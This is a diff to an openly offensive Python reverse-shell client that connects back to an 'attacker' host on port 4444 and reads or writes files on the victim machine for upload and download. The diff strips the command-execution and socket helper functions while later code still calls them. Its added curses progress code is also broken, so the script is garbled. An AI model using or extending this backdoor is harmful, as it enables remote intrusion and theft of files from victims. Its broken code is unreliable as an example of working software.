@@ -3,36 +3,54 @@ import subprocess
 import os
 import json
 import base64
+import curses
 
 # Set up the target server and port (attacker's machine)
 HOST = "127.0.0.1"  # Replace with the attacker's IP address
 PORT = 4444  # Replace with the port the attacker is listening on
 
-def execute_command(command):
-    # Execute the command and return the result
-    return subprocess.run(command, shell=True, capture_output=True)
+def format_size(size_in_bytes):
+    if size_in_bytes < 1024:
+        return f"{size_in_bytes} B"
+    elif size_in_bytes < 1024**2:
+        return f"{size_in_bytes / 1024:.2f} KiB"
+    elif size_in_bytes < 1024**3:
+        return f"{size_in_bytes / 1024**2:.2f} MiB"
+    else:
+        return f"{size_in_bytes / 1024**3:.2f} GiB"
 
-def send_json(socket, data):
-    json_data = json.dumps(data)
-    socket.send(json_data.encode())
-
-def receive_json(socket):
-    json_data = ""
-    while True:
-        try:
-            json_data = json_data + socket.recv(1024).decode()
-            return json.loads(json_data)
-        except ValueError:
-            continue
+def print_progress(current, total, filename, curses_win):
+    current_formatted = format_size(current)
+    total_formatted = format_size(total)
+    curses_win.addstr(f"[*] Uploaded {current_formatted} of {total_formatted} ({filename})\n")
+    curses_win.refresh()
 
 def write_file(path, content):
+    total_size = len(content)
+    current_size = 0
+
     with open(path, "wb") as file:
-        file.write(base64.b64decode(content))
-        return "[+] Upload successful [+]"
+        for chunk in base64.b64decode(content):
+            file.write(chunk)
+            current_size += len(chunk)
+            # Call curses to update live progress
+            curses.wrapper(print_progress(current_size, total_size, path))
+
+    return f"[*] Upload successful: {path} -> {path}"
 
 def read_file(path):
     with open(path, "rb") as file:
-        return base64.b64encode(file.read()).decode()
+        content = file.read()
+        total_size = len(content)
+        current_size = 0
+        encoded = base64.b64encode(content)
+        
+        # Simulate live progress updates
+        for chunk in encoded:
+            current_size += len(chunk)
+            curses.wrapper(print_progress(current_size, total_size, path))
+        
+        return encoded.decode()
 
 # Create a socket object to connect back to the attacker
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -65,7 +83,9 @@ try:
         if command.startswith("upload"):
             try:
                 _, filepath, file_content = receive_json(sock)
+                print(f"[*] Uploading: {filepath} -> {filepath}")
                 response = write_file(filepath, file_content)
+                print(f"[*] Uploaded: {filepath} -> {filepath}")
             except Exception:
                 response = "[+] Error during upload [+]"
             send_json(sock, response)
@@ -74,7 +94,9 @@ try:
         if command.startswith("download"):
             try:
                 _, filepath = receive_json(sock)
+                print(f"[*] Downloading: {filepath} -> {filepath}")
                 response = read_file(filepath)
+                print(f"[*] Downloaded: {filepath} -> {filepath}")
             except Exception:
                 response = "[+] Error during download [+]"
             send_json(sock, response)
